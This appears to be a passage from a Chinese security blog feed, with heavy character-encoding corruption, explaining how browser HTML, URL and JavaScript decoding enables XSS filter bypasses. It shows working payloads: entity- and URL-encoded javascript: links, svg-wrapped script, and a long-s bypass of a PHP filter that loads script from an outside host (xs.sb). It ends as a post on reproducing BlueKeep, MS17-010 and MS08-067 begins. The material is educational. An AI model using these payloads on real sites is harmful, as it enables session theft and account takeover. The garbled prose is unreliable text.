class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯RCDATAè½¬æ€ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹HTMLä¸­æœ‰äº”ç±»å…ƒç´ ï¼š</p><ol><li>ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚<code>&lt;area&gt;,&lt;br&gt;,&lt;base&gt;</code>ç­‰ç­‰</li><li>åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰<code>&lt;script&gt;</code>å’Œ<code>&lt;style&gt;</code></li><li>RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰<code>&lt;textarea&gt;</code>å’Œ<code>&lt;title&gt;</code></li><li>å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚MathMLå‘½åç©ºé—´æˆ–è€…SVGå‘½åç©ºé—´çš„å…ƒç´ </li><li>åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´ </li></ol><p>äº”ç±»å…ƒç´ çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><ol><li>ç©ºå…ƒç´ ï¼Œä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼ˆå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ï¼‰ã€‚</li><li>åŸå§‹æ–‡æœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€‚</li><li>RCDATAå…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚</li><li>å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š</li><li>åŸºæœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š</li></ol><p>æ³¨æ„åˆ°RCDATAä¸­æœ‰<code>&lt;textarea&gt;</code>å’Œ<code>&lt;title&gt;</code>ä¸¤ä¸ªå±æ€§å¹¶ä¸”æœ‰å­—ç¬¦å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å½“å®ä½“å­—ç¬¦å‡ºç°åœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾é‡Œé¢çš„æ—¶å€™ï¼Œå®ä½“å­—ç¬¦ä¼šè¢«è¯†åˆ«ï¼Œåšä¸€ä¸ªHTMLç¼–ç è§£æï¼Œæ‰€ä»¥ä¸‹é¢è¿™ä¸ªè¯­å¥è§¦å‘ä¸äº†xssï¼Œæ ‡ç­¾å†…å®¹è¢«è½¬ä¹‰äº†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœç›´æ¥æ”¾è¿›å»æ ‡ç­¾çš„å†…å®¹å‘¢ï¼Œä¸å¸¦è½¬ä¹‰å­—ç¬¦å‘¢ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·ä¹Ÿæ˜¯ä¸ä¼šè§¦å‘xssçš„ï¼Œåœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾å†…ï¼Œæ˜¯ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œä¹Ÿå°±æ˜¯è¯´é‡Œé¢çš„å†…å®¹ä¸ä¼šå½“åšHTMLä»£ç è§£æï¼Œåªè®¤<code>&lt;textarea&gt;</code>æˆ–<code>&lt;title&gt;</code>æ ‡ç­¾æ¥ç»“æŸ</p><p>å¦å¤–è¿˜æœ‰ä¸€ç‚¹æ³¨æ„ï¼šæˆ‘ä»¬ä»ä¸Šé¢çš„å…ƒç´ ä¸­è¿˜å‘ç°æœ‰ä¸€ä¸ªåŸå§‹æ–‡æœ¬å…ƒç´ <code>&lt;script&gt;</code>åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œåé¢çš„å†…å®¹ä¸­<br>çš„ç¼–ç å¹¶ä¸ä¼šè¢«è½¬ä¹‰ã€‚æµè§ˆå™¨çœ‹ä¸æ‡‚ä¸­é—´è¿™å †ä¸œè¥¿æ˜¯å•¥ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è®©é‡Œé¢çš„å†…å®¹è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åæ‰§è¡Œå¼¹çª—å‘¢ï¼Œä¸‹é¢ä¼šæåŠã€‚</p><h4 id="URLè§£æ"><a href="#URLè§£æ" class="headerlink" title="URLè§£æ"></a>URLè§£æ</h4><p>è¯´åˆ°urlè§£æï¼Œå¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰ï¼Œè‚¯å®šè¦æ¶‰åŠåˆ°urlç¼–ç ï¼Œæœ¬è´¨æ˜¯æŠŠä¸€ä¸ªå­—ç¬¦è½¬ä¸º%åŠ ä¸ŠUTF-8ç¼–ç å¯¹åº”çš„16è¿›åˆ¶æ•°å­—ã€‚è¿™é‡Œçš„urlè§£ææŒ‡çš„å°±æ˜¯URLè§£ç ï¼Œåœ¨æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šè‡ªåŠ¨å¯¹è¯·æ±‚è¿›è¡Œä¸€æ¬¡URLè§£ç ã€‚ä½†æ˜¯ä»Šå¤©è¿™ç¯‡æ–‡ç« æ¶‰åŠçš„URLè§£ç æ˜¯å‘ç”Ÿåœ¨æœåŠ¡å™¨æ¥æ”¶ä¹‹åçš„ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œä¸ç„¶URLè§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­å†’å·å‰é¢çš„ä¸€æ®µURLç¼–ç å†…å®¹ï¼ŒæŠŠ<code>javascript</code>ç»™ç¼–ç äº†ï¼Œè¿™æ—¶å€™ä¸ä¼šè¢«URLè§£æå™¨è¯†åˆ«ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè§¦å‘xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ¢è¿‡æ¥å¦‚æœæ˜¯è¿™æ ·ï¼Œå¦‚ä¸‹ï¼Œç»è¿‡äº†Htmlè§£æä¹‹åï¼Œè¿›å…¥hrefï¼Œå°±å¼€å§‹urlè§£æäº†ï¼Œæ²¡æœ‰æŠŠåè®®ç»™ç¼–ç ï¼Œå¤Ÿè¢«URLè§£æå™¨æ­£ç¡®è¯†åˆ«ã€‚ç„¶åURLè§£æå™¨ç»§ç»­è§£æé“¾æ¥å‰©ä¸‹çš„éƒ¨åˆ†ï¼Œæœ€åå°±ä¼šè§¦å‘xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="JavaScript-è§£æ"><a href="#JavaScript-è§£æ" class="headerlink" title="JavaScript è§£æ"></a>JavaScript è§£æ</h4><p>å¥½åƒåªå¯¹UNICODEç¼–ç èµ·ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯å½¢å¦‚<code>\u4e00</code>ï¼Œå‰å¯¼çš„ u è¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªunicode å­—ç¬¦ï¼Œå½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚<code>&lt;script&gt; &lt;style&gt;</code>è¿™æ ·çš„æ ‡ç­¾ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JSè§£ææ¨¡å¼ï¼Œè€Œ<code>src</code>ã€ <code>href</code>åè¾¹åŠ å…¥çš„javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥JS çš„è§£ææ¨¡å¼ã€‚</p><p>ä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šjsè§£æçš„å­—ç¬¦ä¸ä¸€å®šå…¨éƒ¨éƒ½ä¼šå½“æˆjsä»£ç è§£æï¼Œéœ€è¦åˆ†æƒ…å†µï¼Œè½¬ä¹‰åºåˆ—æ”¾åœ¨3ä¸ªéƒ¨åˆ†ï¼šå­—ç¬¦ä¸²ä¸­ï¼Œæ ‡è¯†ç¬¦åç§°ä¸­å’Œæ§åˆ¶å­—ç¬¦ä¸­ã€‚</p><p>å…¶ä¸­å­—ç¬¦ä¸²ï¼Œå’Œæ§åˆ¶å­—ç¬¦éƒ½æ˜¯ä¼šè¢«è½¬ä¹‰æˆæ–‡æœ¬ï¼Œä¸ä¼šå½“åšjsä»£ç çš„ä¸€éƒ¨åˆ†æ‰§è¡Œï¼Œæœ‰å“ªäº›æ˜¯æ§åˆ¶å­—ç¬¦ï¼Ÿæ¯”å¦‚å•åŒå¼•å·ã€æ‹¬å·ç­‰è½¬ç§»ä¹‹ååªå½“æˆæ–‡æœ¬çœ‹å¾…ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶alertè¯­å¥é‡Œé¢è™½ç„¶<code>\u0027</code>è¢«è½¬ä¹‰æˆå•å¼•å·ï¼Œä½†æ˜¯åªæ˜¯æ–‡æœ¬ï¼Œå¹¶ä¸æ˜¯jsè¿è¡Œä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œç›¸å½“äºæ­¤æ—¶å·®å•ä¸ªå¼•å·é—­åˆï¼Œæ‰€ä»¥æ˜¯ä¸ä¼šæ‰§è¡Œçš„ï¼Œåˆæ¯”å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç»è¿‡jsè§£ç ä¹‹åå·¦å³æ‹¬å·éƒ½è¢«å½“æˆæ–‡æœ¬ï¼Œç›¸å½“äºalertå‘½ä»¤æ²¡æœ‰äº†æ‹¬å·ï¼Œä¹Ÿè¿è¡Œä¸æ¥</p><p>ä½†æ˜¯å¯¹äºåœ¨æ ‡è¯†ç¬¦åç§°ä¸­æ—¶ï¼Œå®ƒä¼šè¢«è§£ç å¹¶è§£é‡Šä¸ºæ ‡è¯†ç¬¦åç§°çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚å‡½æ•°åï¼Œå±æ€§åç­‰ç­‰ï¼Œæ¯”å¦‚å°†<code>alert</code>å…³é”®å­—ç¼–ç åï¼Œå½“è§£ç ä¹‹åä»–ä¼šæˆä¸ºjsæ‰§è¡Œä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œå¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ä¸€äº›XSSä¾‹å­åˆ†æ"><a href="#ä¸€äº›XSSä¾‹å­åˆ†æ" class="headerlink" title="ä¸€äº›XSSä¾‹å­åˆ†æ"></a>ä¸€äº›XSSä¾‹å­åˆ†æ</h3><p><strong>ä¾‹å­ä¸€</strong>ï¼šå†æ¥å›çœ‹HTMLç¼–ç é‡Œé¢çš„è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼Œè¿™ä¸ªä¾‹å­æ˜¯å¯ä»¥è§¦å‘xssçš„ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å›é¡¾ä¸€éæµç¨‹ï¼Œå…ˆæ˜¯Htmlè§£ç ï¼Œå˜æˆä¸‹é¢çš„æ ·å­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)"</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å†æ¥URLè§£ç ï¼Œåè®®æ²¡æœ‰ç¼–ç ï¼Œå¯ä»¥æ­£å¸¸è§£æï¼Œå˜æˆä¸‹é¢çš„æ ·å­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(15)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥jsè§£æçš„é˜¶æ®µï¼Œè§£æçš„æ˜¯å…³é”®å­—ï¼Œå¯ä»¥å½“åšjsä»£ç æ‰§è¡Œï¼Œæœ€åè¿˜æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(15)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä¾‹å­äºŒ</strong>ï¼š ä¸Šé¢çš„htmlç¼–ç ç•™ä¸‹çš„ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•ç»•è¿‡HTMLåŸå§‹æ–‡æœ¬å…ƒç´ è¿›è€Œæ‰§è¡ŒHTMLè½¬ä¹‰å‘¢ï¼Œæ¶‰åŠåˆ°<code>&lt;svg&gt;</code>çš„é­”åŠ›ï¼Œé‚£æ˜¯ä¸€ç§ç‰¹æ®Šçš„è§¦å‘æ•ˆæœï¼Œå•çº¯scriptæ ‡ç­¾å†…åŠ è½½htmlå®ä½“ç¼–ç ï¼Œåªä¼šå½“åšæ–‡æœ¬ï¼Œæ²¡æœ‰ä»»ä½•è§¦å‘ç»“æœï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://s2.ax1x.com/2019/09/10/napYrV.png" alt="napYrV.png"></p><p>ä½†æ˜¯å½“å¤–é¢åŠ ä¸Š<code>&lt;svg&gt;</code>ä¼šå¦‚ä½•ï¼Ÿå‡ºå‘äº†å¼¹çª—ï¼Œè¿™åˆæ˜¯ä¸ºä½•ï¼Ÿ</p><p><img src="https://s2.ax1x.com/2019/09/10/napWIe.png" alt="napWIe.png"></p><p>æ˜¯å› ä¸º<code>&lt;svg&gt;</code>æ ‡ç­¾å±äºäº”å¤§å…ƒç´ ä¸­çš„å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è§£æåˆ°<code>&lt;svg&gt;</code>æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨å°±å¼€å§‹ä½¿ç”¨ä¸€å¥—æ–°çš„æ ‡å‡†å¼€å§‹è§£æåé¢çš„å†…å®¹ï¼Œç›´åˆ°ç¢°åˆ°é—­åˆæ ‡ç­¾<code>&lt;/svg&gt;</code>ã€‚è€Œåœ¨è¿™ä¸€å¥—æ–°çš„æ ‡å‡†éµå¾ªXMLè§£æè§„åˆ™ï¼Œåœ¨XMLä¸­å®ä½“ç¼–ç ä¼šè‡ªåŠ¨è½¬ä¹‰ï¼Œé‡æ–°æ¥ä¸€éæ ‡ç­¾å¼€å¯çŠ¶æ€ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡Œxssäº†ã€‚</p><p><strong>ä¾‹å­ä¸‰</strong>ï¼šä¸»è¦æ˜¯æ¥æºäºæˆ‘æœ€è¿‘è§åˆ°çš„ä¸€ä¸ªé¢˜ç›®ï¼Œä½¿ç”¨äº†å¦å¤–çš„ç¼–ç æ–‡å­—ç»•è¿‡ï¼Œè¿™ä¸ªé¢˜ç›®è®¾è®¡å¾—å¾ˆå·§å¦™ï¼Œæˆ‘è¿™é‡Œç”¨phpæ¨¡æ‹Ÿä¸€ä¸‹å†™äº†ä¸ªåå°ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line"><span class="comment">// $name = "&lt;script&gt;alert(1)&lt;/script&gt;";</span></span><br><span class="line"> $name =  strtoupper($name);</span><br><span class="line"> <span class="keyword">echo</span> $name;</span><br><span class="line"> <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;[A-Z0-9]+/"</span>, $name) !== <span class="number">0</span>)&#123;</span><br><span class="line"> $name = preg_replace(<span class="string">'/&lt;/'</span>, <span class="string">'&lt;_'</span>, $name, $count=<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> $name;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œå°±ä¼šå˜æˆ<code>&lt;_SCRIPT&gt;ALERT(1)&lt;/SCRIPT&gt;</code>ï¼Œè¿™é‡Œé¢è¦è§¦å‘xssï¼Œéœ€è¦ç»•è¿‡ä¸¤ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯å¤§å†™çš„é—®é¢˜ï¼Œjsæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥ç›´æ¥åœ¨æ ‡ç­¾å†…å†™å¼¹çª—è„šæœ¬æ˜¯ä¸å¤ªå¯è¡Œçš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥å¼•å…¥å¤–éƒ¨çš„jsï¼Œæ¯”å¦‚<code>&lt;scriptv src=//xs.sb/idqS&gt;&lt;/script&gt;</code>ï¼Œè¿™å°±å¯ä»¥ç»•è¿‡ã€‚</p><p>å¦å¤–å°±æ˜¯è¦ç»•è¿‡<code>&lt;_</code>çš„é—®é¢˜ï¼Œå› ä¸ºåå°åŒ¹é…çš„æ˜¯<code>&lt;</code>ç¬¦å·åé¢æ¥ä¸Šæ­£å¸¸çš„å­—æ¯ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ä¸æ­£å¸¸çš„è‹±æ–‡å­—æ¯å‘¢ï¼Ÿè¿™é‡Œåˆšå¥½æœ‰å¦å¤–ä¸€ä¸ªæ¡ä»¶å°±æ˜¯è½¬åŒ–å¤§å†™çš„è¿™ä¸ªæ“ä½œï¼Œè¿™ä¸ªæ“ä½œå¾ˆå¦™ï¼Œå› ä¸ºHTMLæ ‡ç­¾æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œè¿™æ ·æˆ‘ä»¬ä½¿ç”¨ä¸‹å›¾çš„è¿™ä¸ªæ‹‰ä¸å­—æ¯ï¼Œå½“è½¬åŒ–æˆå¤§å†™çš„è¯å°±åˆšå¥½æ˜¯Sï¼Œè€Œä¸”å¥½åƒæ˜¯åªæœ‰è¿™ä¸ªæ‹‰ä¸æ–‡æ‰æœ‰è¿™æ ·çš„æ•ˆæœã€‚</p><p><img src="https://s2.ax1x.com/2019/09/10/naM00g.png" alt="naM00g.png" style="zoom: 30%;"></p><p>å¦™å•Šï¼Œæœ€åçš„payloadï¼š<code>&lt;Å¿cript src=//xs.sb/idqS&gt;&lt;/script&gt;</code></p><p>ä¾‹å­ä¸‰å’Œä¾‹å­å››ï¼Œç­‰æ ¡èµ›ä¹‹åå†æ”¾å‡ºæ¥å§</p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://saucer-man.com/information_security/103.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/103.html</a></p><p><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p>]]></content>
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2019-0708ï¼ŒMS17-010ï¼ŒMS08-067æ¼æ´å¤ç°</title>
      <link href="/msf-cve-review.html"/>
      <url>/msf-cve-review.html</url>
      <content type="html"><![CDATA[<p>è™½ç„¶ç½‘ä¸Šéƒ½ä¸€å¤§å †äº†ï¼Œæœ‰äº›è‡ªå·±è¸©è¿‡çš„è¿˜æ˜¯è¦è®°å½•ä¸€ä¸‹ï¼Œæ¯•ç«Ÿæœ‰ç”¨<a id="more"></a>ã€‚</p><h3 id="CVE-2019-0708-BlueKeep"><a href="#CVE-2019-0708-BlueKeep" class="headerlink" title="CVE-2019-0708 (BlueKeep)"></a>CVE-2019-0708 (BlueKeep)</h3><p>è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼ˆä»¥å‰ç§°ä¸ºç»ˆç«¯æœåŠ¡ï¼‰ä¸­å­˜åœ¨è¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ï¼Œå½“æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä½¿ç”¨RDPè¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿå¹¶å‘é€ç‰¹åˆ¶è¯·æ±‚æ—¶ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚windows2003ã€windows2008ã€windows2008 R2ã€windows xpç³»ç»Ÿéƒ½ä¼šé­åˆ°æ”»å‡»ã€‚</p><h4 id="æ¼æ´ç¯å¢ƒ"><a href="#æ¼æ´ç¯å¢ƒ" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h4><p>ç”±äºç°é˜¶æ®µçš„expåªèƒ½åœ¨win7 sp1ç‰ˆæœ¬å’Œwin 2008 R2ç‰ˆæœ¬èµ·ä½œç”¨ï¼Œè¿™é‡Œé€‰æ‹©win7  sp1 ï¼Œç»æœ¬äººæµ‹è¯•ï¼Œè¯¥expåˆ©ç”¨æˆåŠŸç‡ä¸å¤ªé«˜ï¼Œç»å¸¸æ€§ no session was 